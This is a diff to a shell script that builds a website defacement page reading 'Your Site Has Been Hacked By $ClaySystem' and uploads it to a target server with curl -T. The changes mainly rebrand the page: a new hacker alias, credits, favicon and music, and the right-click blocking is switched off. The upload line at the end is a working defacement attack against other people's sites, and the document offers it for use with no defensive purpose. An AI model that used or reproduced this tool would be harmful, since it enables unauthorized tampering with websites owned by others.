@@ -19,10 +19,10 @@ cat <<LOGIN>index.html
 <body bgcolor=black>
 <table width=100% height=100%><td align=center><br><br><br><br><br><br><br><br>
 <link href='http://fonts.googleapis.com/css?family=Orbitron:700' rel='stylesheet' type='text/css'>
-<Link href='http://dhewa.yu.tl/files/fb-indonesia.jpg' rel='SHORTCUT ICON'/>
+<Link href='https://i.ibb.co/56THD48/In-Shot-20210203-014000522.jpg' rel='SHORTCUT ICON'/>
 <meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
-<title>Hacked By $user</title>
-<body oncontextmenu='return false;' onkeydown='return false;' onmousedown='return false;'>
+<title>Hacked By $ClaySystem</title>
+<body oncontextmenu='return true;' onkeydown='return true;' onmousedown='return true;'>
 <style type="text/css">
 h1 {color: #333;font-size: 50px;margin: 1px auto;text-align:center;text-transform:uppercase; font-family:Orbitron;}
 .neon {color: #FFFFFF;text-shadow: 0 0 5px #1ab4e7, 0 0 10px #1ab4e7, 0 0 30px #18a2d0, 0 0 45px #18a2d0, 0 0 60px #18a2d0;}
@@ -60,13 +60,13 @@ var message="Sorry, right-click has been disabled";
 
 ///////////////////////////////////
 
-function clickIE() {if (document.all) {(message);return false;}}
+function clickIE() {if (document.all) {(message);return true;}}
 
 function clickNS(e) {if
 
 (document.layers||(document.getElementById&&!document.all)) {
 
-if (e.which==2||e.which==3) {(message);return false;}}}
+if (e.which==2||e.which==3) {(message);return true;}}}
 
 if (document.layers)
 
@@ -74,7 +74,7 @@ if (document.layers)
 
 else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;}
 
-document.oncontextmenu=new Function("return false")
+document.oncontextmenu=new Function("return true")
 
 // -->
 
@@ -441,7 +441,7 @@ for(i = 0; i < split.length; ++i) {
 
 if(Math.random() < lit) {
 
-split[i].className = "neon";
+split[i].className = "purpleneon";
 
 } else {
 
@@ -472,15 +472,16 @@ setInterval(flicker, 100);
 
 <br>
 
-<h1>Your Site Has Been Hacked By $user </h1>
+<h1>Your Site Has Been Hacked By $ClaySystem </h1>
 
 
-<div id="matrix" class="auto-style8">SCRIPT BY MR_DARK
-pesan : $pesan1</div>
+<div id="matrix" class="auto-style8">SCRIPT BY ClaySystem
+pesan : $Credit : #WhoAmI</div>
 <br>
 
 <center>
-<audio autoplay="autoplay" controls="controls" src="https://i.top4top.io/m_16036g6f61.mp3" type="audio/mpeg"></audio>
+<audio autoplay="autoplay" controls="controls" src="https://m.soundcloud.com/user-734902375/babalos-snow-crystal-185-3"
+frameborder="0" type="audio/mpeg"></audio>
 </center>
 <center>
 
@@ -541,7 +542,7 @@ pesan : $pesan1</div>
         }
                 
         if(charIndex<=stringLength){
-            setTimeout('writeContent(false)',100);
+            setTimeout('writeContent(true)',1000);
         }else{
          blinkSpan();
         }  
@@ -549,7 +550,7 @@ pesan : $pesan1</div>
         var currentStyle = 'inline';
     function blinkSpan(){
      if(currentStyle=='inline'){
-      currentStyle='none';
+      currentStyle='inline';
      }else{
       currentStyle='inline';
      }
@@ -572,4 +573,4 @@ snowStorm.useTwinkleEffect = true;
 <center> </div><br> <iframe width="0" height="0" src="https://i.top4top.io/m_16036g6f61.mp3" frameborder="0" loop="true" autoplay="true" allowfullscry=""></iframe> </font> <p></p></body></html>
 LOGIN
 curl -T /$HOME/index.html $target
-echo -e "\e[1;32mTarget Anda Telah Di deface\e[0m"
+echo -e "\e[1;32mSuccessfull \e[0m"
